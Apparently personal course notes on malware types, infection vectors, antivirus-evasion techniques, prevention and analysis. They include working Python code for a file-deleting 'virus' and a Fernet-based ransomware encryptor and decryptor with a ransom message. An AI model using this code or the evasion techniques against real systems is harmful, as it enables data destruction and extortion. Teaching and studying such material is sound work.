
# Malware
one of the cybersecurity field's

- A Malware is a **set of instructions(program) that run on your computer** and **make your system do something that an attacker wants it to do.** 
- The name Malware Come from 
     - **Malicious** => ተንኮለኛ(**bad thing**) 
     - **Software** => set of instruction(**program**) 
         - ==Mal - ware==

#### What malwares do? 
1. Removing data/files
2. Encrypting data/files 
3. Corrupting data/files 
4. Stealing Data/files 
5. Spying on user

# Kinds of Malwares 
Based on their propagation/infection and attack, there are many kinds of malwares. 
1. Trojan 
2. Worm 
3. Virus 
4. Ransomware 
5. Rootkit
6. Adware

### TROJAN! 
- Trojan, is a type of malicious code or software that **==looks legitimate== but can take control of your computer.**
- A Trojan is **designed to damage, disrupt, steal, or in general inflict some other harmful action on your data or network.** 
- They **don’t ==replicate==**. 
- The name Trojan came from the **Greek mythology Trojan Horse**. 
- Trojans will **looks normal or legit software** and **then BOOM!**

#### Common types of trojan
1. ==Backdoor== Trojan ---------------once the port is opened they create another backdoor for them
    -  This Trojan can create a “የጀርባ በር” on your computer. It lets an attacker access your computer and control it. Your data can be downloaded by a third party and stolen. Or more malware can be uploaded to your device. 

2. ==Mail-finder== Trojan - for spy purpose
    -  This Trojan seeks to steal the email addresses you’ve accumulated on your device. 
3. ==Remote Access== Trojan  (RAT) -----do like ssh port for accessing their server remotely.  by opening terminal
     - This Trojan can give an attacker full control over your computer via a remote network connection. Its uses include stealing your information or spying on you. 
           - i. ==C2 Servers(Command and Control)==: This is just the server which the malware communicate with, to pass commands to the malware also to have control over the malware to send and receive data.
           - used not only on RAT but also on any types of trojan that is intended for **spying purpose** to send the file to the server(c2)that is stolen or something. spy maregiya(like backdoor)bemetekem, then spy yaregew virus/malware merejawn milakbet bota c2 server ybalal
           - C2 servers  --  can be made by any hacker after buying the server. 
                    -- also there is software and we can run it on our server  like havoc-- https://github.com/HavocFramework/Havoc  
1. ==Trojan banker== 
     - This Trojan takes aim at your financial accounts. It’s designed to steal your account information for all the things you do online. That includes banking, credit card, and bill pay data. then sent it to the c2 server


### Worm 
- A computer worm can **propagate or self-replicate from one computer to another *without human interaction* after breaching a system**. it is **==not legitimate ==**
- *Typically*, a worm **spreads across a network *through your Internet or LAN (Local Area Network) connection.* - difference with virus is this(LAN) **
- **Damages files on the system and the system**

### Virus 
- They are the older and famous ones 
- Virus is a program written to get to your computer and **damage/alter your files/data.** 
- A virus might corrupt or delete data on your computer. 
- Viruses can also **replicate** themselves. not on LAN
- A computer Virus is more dangerous makes changes or deletes your files

#### Common signs of virus infection 
- Speed of System , network speed-- when it is spy and sends file/data to the c2 server 
- Pop-up windows 
- Self-executing 
- Account being log out 
- Crashing of device/window -- when viruses destroy computer system files
- Mass emails being sent from you  
- Files and system settings are altered.

#### Common types of virus 
There are several types of computer viruses that can infect devices. 
1. ==Resident== Virus 
    - Viruses propagate themselves by infecting applications on a host computer. A resident virus achieves this by infecting applications as they are opened by a user. 
        - A ==non-resident== virus is capable of infecting executable files when programs are not running. 
2. ==Multipartite== Virus 
    - A multipartite virus uses multiple methods to infect and spread across computers. It will typically **remain in the computer’s memory to infect the hard disk**, then **spread through** and **infect more drives** *by altering the content of applications.* This results in **performance lag** and **application memory running low**. 
3. ==Browser Hijacker ==
    - A browser hijacker **manually changes the settings of web browsers, such as replacing the homepage, editing the new tab page, and changing the default search engine.** Technically,**it is ==not a virus== because it ==cannot infect file==**


### Ransomware
- Ransomware is malware that **employs encryption to hold a victim’s information at ransom.** 
- A user or organization’s critical **data is encrypted** so that they cannot access files, databases, or applications 
- **A ransom is then demanded to provide access**. 
- Ransomware is ***often*** **designed to spread across a network and target database and file servers**, and can thus **quickly paralyze an entire organization.**
★==Ransomware => RANSOM + SOFTWARE==


### Rootkit 
- A rootkit is a malicious software bundle **designed to give unauthorized access to a computer or other software**. 
- Rootkits are **hard to detect** and **can conceal their presence within an infected system.** 
- **Hackers use** rootkit malware **to remotely access your computer, manipulate it, and steal data**


### Adware 
- Adware, or **advertising supported software**, is software that **displays unwanted advertisements on your computer.** 
- Adware programs will **tend to serve you pop-up ads,** can **change your browser's homepage,** **add spyware and just bombard your device with advertisements**



# How do they infect? 
#### USB drop attack ( infected removable drives )
- Hackers drop them around your company and when you plug it, BOOM!
- flashes like rubber ducky-- act like keyboard(the computer will take the flash as keyboard).  at first the flash has a malware code(the code is to download malware and run it). once it is plugged in, the code is written automatically and run. then it downloads the malware and boom
- pen driver
#### Spam emails
#### Malicious Office macros
#### Software/Applications from unsafe websites
- Torrent sites
#### Using Cracked Software
#### Malicious Browser extension
- manually


# How they are Stealth/undetected By Anti-Malware 
- One of The **Protection method from Malwares** is Using of **Anti-Malware/Virus.**
- But **How does there Anti Malwares Know if something is malware or not?** 
     - This can be based on Different Things. But **Most Anti Virus Works, By detecting the file Hash/ Signature**.
 - attackers can pass anti virus, how?
     - anti-virus detect malwares using hash/signature- file are converted to hexdecimal value. there is what we call ioc indicator of compromiser from the file. so if there is new virus anti viruses take ioc(what we call signiture) from that virus. so they use it and prevent the computer based on that ioc/signature.

## Hackers use different methods to pass some protections and infect that system. 
1. ==Packers== 
    - A packer is a program that **compresses an executable to make it smaller.** It **wraps the compressed executable in the code necessary to decompress itself at runtime**. **Packing changes this the binary patterns and some hashes**(day5) , so the AV may not detect the packed file. 
    - ==there is a signature change.  by the compresser==
        - when we compress values less signature/hash like 000  will be erased so there would be size decrease. 
2. ==Crypters/encoders== 
     - A crypter is similar to a packer but **adds additional obfuscation or encryption** to the mix. Like a packer, its goal is to **change the binary fingerprint of a file to avoid detection.** In a ==nutshell==, the **crypter encrypts the original executable using an encryption algorithm** — often something as simple as a **XOR cipher with a unique pkey**. 
     - ==similar to packer but change the signature by the hacker==
3. ==Polymorphic Malware== 
     - At the highest level, polymorphic malware is malware that **repeatedly uses packing and crypting methods** ==to change the way it looks.== 
     - c==hange their type/hash frequently==. different signature on different computers. like HIV 
4. ==Downloaders, Droppers, and Staged Loading== 
     - Many kinds of malware use **staging programs** called **droppers or downloaders** to **learn about a system before installing the real malware**. Some of these droppers scope **out a system first to avoid triggering security alerts** **when they download and install the real payload**.
     - ==pre-infection==


# Malware Prevention
1. Install anti-virus and anti-spyware software. 
     - Example: kaspersky, avg, smadav 
2. Use secure authentication methods. 
     - 2-factor authentication 
     - Implement email security and spam protection 
3. Keep software updated 
4. Use the least-privilege model. 
5. Monitor for suspicious activity 
6. Educate your users


# Malware in history
some malwares happened in history:
1. ==Morris Worm==: Also known as the Internet worm, this was one of the first computer worms to spread via the Internet and earn notoriety in the media.
2. ==ILOVEYOU==: The ILOVEYOU virus infected tens of millions of computers globally, resulting in billions of dollars in damage.  __macro finder  mail-finder__
3. ==Stuxnet==: Some experts believe this sophisticated worm was developed for years to launch a cyberattack. scada system-computer
4. ==Wanna-Cry==: is a ransomware which targeted computers running the Microsoft Windows operating system by encrypting (locking) data and demanding ransom payments in the Bitcoin cryptocurrency.


# Python for Malware development 
- As we saw malwares do so many things and we can develop that malware based on the algorithm, We need. 
- First we have to understand what our malware have to do. 
- There are so many kinds of malware purpose 
     - Delete files 
     - Encrypt files 
     - Corrupt files 
- Then You can Convert your python file to executable(exe) by py2exe technics
**- for the sake of malware speed and to be undetectable by antivirus black hut hackers use low level programming language for development like c/c++/. highlevel programming language detected easly because of libraries and modules**.


### Malware #1 - File deleting malware 
- algorithm 
      - When it load the program will delete files 
         - The file being deleted is based on our plan, but if the file needs root access then we need to build the rootkit too.
    - Lets create a test folder and our virus.py file 
    - Also let’s create some random files for test.
##### code
- Import os package 
    - OS package is a module that **helps us to interact and do some Terminal commands because** python is not like bash and **cant run shell commands directly**.
    - it's methods are ()
          - listdir---- os.listdir() - to list the folders and files on that specific folder
          - remove
          - rename
          - unlink
          - chdir
          - environ
          - system
          - abort
          - access
          - add_dll_directory
          - altsep
          - chmod
          - close

```python
import os

files=[]
folders=[]

for fil in os.listdir():
   if fil != "virus.py": 
       if os.path.isfile(fil):
           files.append(fil)
       else :
            folders.append(fil)
   else :
       pass

for i in files:
    os.remove(i)
for j in folders:
    os.removedirs(j)

```

print("YOUR SYSTEM IS INFECTED BY VIRUS YOUR FILES ARE GONNNNE!")

==!!! Sure to do them on the appropriate folder==
==when we run this virus......BOOM==


**exercise**
Write a virus that creates 20 files with name virus_1 virus_2… a. Use os.system(“your shell code”) => you can use f” { variable }” as the print function

```python
import os
for i in range(1,21):
     os.system(f"touch virus_{i}")
print("files created")
```




## File Handling in python 
- Files are **names locations** ***on disk to* store related information.** 
- Files Used to **Store Data in Storage Devices.** 
- When we want to read from or write to a file, 
     - we need to open it. 
     - And also when we are done we will close it. 
- In Python ,a File Operation takes place in the following order: 
     - Open a File 
     - Read or Write(perform operation) 
     - Close the file
- Python has a built-in function called open(). 
- Syntax: 
    - ==with open(“fileName or filePath”,’x’) as var ==
          ==var.write("hello there")==
- Modes: 
     - write---------------------------------w 
     - read---------------------------------r 
     - append---------------------------a 
     - Create----------------------------- x 
     - text mode-------------------------t 
     - binary mode---------------------b 
- Example: 
     - with open(“fileName”,’w’) as var: 
          var.write("hey")
     - with open(“fileName”,’rt’) as var:-> rt ~ r --text mode is default


##### Reading files 
- There are many methods for this. But, we can use the read 
     - read() - >This read file up to the inputted size number. BUT if you don’t add the size it will read it until the end. 
     - readline() -> To read files only one line 
     - readlines() -> reads all file in 1 line 
     - Syntax: 
         - var.read(5) 
         - var.readline() 
         - var.readlines()
 - example
   -  with open("notes.txt", 'r') as file:
        print(file.read())
##### Checking existence. 
- To check if the file is created before: 
      import **os** 
      if **os.path.exists**(“filename”): 
         print(“the file already exist!”) 
     else: 
         print(“no file!”)


Exercise 2 
1. Write a program That can Create And write “This is My file” text 
    -  Implement file exist error bypass method. 
```python

import os

urr=input('continue-c/exit-e - ')
if urr=='c':
    ur=input('create new file - ')
    while urr=='c':
        try:
            with open(ur ,'x') as cr: 
                cr.write('This is My file')
        except:
             print('the file already existed! make new file') 
             urr=input('\ncreate/exit(c/e) - ')
else:
    print('\nnot created')


```

2. Write a program that can Create a file on The Desktop 
     - Add the desktop path with the filename “~/Desktop/hello.txt” 
```python
import os

a='t'
while a=='t':
    user=input('\n create a file on the desktop - ')
    ul=os.path.expanduser(f'~/Desktop/{user}')
    try:
        with open(ul,'x') as l:
            l.write('this file is created based on location ')
            print('\n file created on a Desktop')
            break
    except:
        print('\n file already existed!')
        us=input('\n try_new/exit - t/e ')
        if us!='t':
           break
        
    
    
```


3. Write a program that can Read File some random text file. 
     - Accepts input and read that file 
```python
import os
a='continue'
while a=='continue':
    try:
        us=input('\n Enter the file path - ')
        f=os.path.expanduser(us)

     
        with open(f,'r') as ra:
            print(ra.read())
    except:
        print('incorrct filepath')  
        
    try:          
        user=input('\n continue/exit - ')
  
        if a!=user:
            break
    except:
        print('enter 1 - to read more or 0 - to exit')        


```

4. Write a program that can delete File if it exist. 
    -  Use os package
```python
import os

a='continue'
ur=input('\n continue/exit - ')
while ur==a:
    user=input('\n enter any file u wanna delete - ')
    if os.path.exists(user):
        os.remove(user)
        print('\n removed successfully')
        ur=input('continue/exit - ')
        if a!=ur:
           break
    else:
        print('file does not exits')

```



### Malware #2 - File Ransomware 
- Here we are going to do our own ransomware. 
-  So how do ransomware works…. Algorithm? 
    - They scan the system files 
    - They will encrypt them with some key 
    - Done! 
- We can do the decrypter to 
    - It accepts the key 
    - Decrypt the system files
- For our example we just encrypt and decrypt of files in our test folder 
- For this we can use Fernet module from cryptography package

##### Coding our ransomware
- encrypt
```python
import os
from cryptography.fernet import Fernet

files=[]

key = Fernet.generate_key()

with open('masterkey.key','xb') as mykey:
    mykey.write(key)

for fil in os.listdir():
    if fil!='masterkey.key' and os.path.isfile(fil) and fil!='ransomewareD.py' and fil!= 'ransomewareE.py':
        files.append(fil)
        
for fl in files:
    with open(fl,'rb') as content:
        a=content.read()
    encrypt=Fernet(key).encrypt(a)
    
    with open(fl,'wb') as encry_file:
        encry_file.write(encrypt)
print('YOUR FILES ARE ENCRYPTED!! \n PAY $100 AT @MAHNET AND GET YOUR FILES!!')

```

- decrypt
```python
import os 
from cryptography.fernet import Fernet

files=[]

with open('masterkey.key','rb') as mykey:
    key=mykey.read()
    
for fil in os.listdir():
    if fil!='masterkey.key' and os.path.isfile(fil) and fil!= 'ransomewareE.py' and fil!='ransomewareD.py':
        files.append(fil)
    
for fl in files:
    with open(fl,'rb') as content:
        a=content.read()
    
    decrypt=Fernet(key).decrypt(a)
    
    with open(fl,'wb') as decry_file:
       decry_file.write(decrypt)
   
print('YOUR FILES ARE DECRYPTED!! \n THANKYOU FOR PAYING!!')
```


## Malware Analysis 
- Malware analysis is a **process of analyzing malwares** 
- When a system is infected with malwares , **Security testers** will do analysis on that malware. 
- But 1st  will **hold the malware as sample** it is called ==artifact==  
- **Then** They will do the ==**analysis==** 
- There are 2 types of analysis 
     - **Static Analysis**: Analyzing the virus, **==by just seeing== the byte codes and the meta data. **
     - **Dynamic Analysis**: is a process of analyzing the virus **==by running== the malware in ==Sandbox/virtual machine==**(can be reinstalled or they have the technology called "snapshut")(files and viruses taken in RAR file kolfen) Then **understanding the malware behavior.**


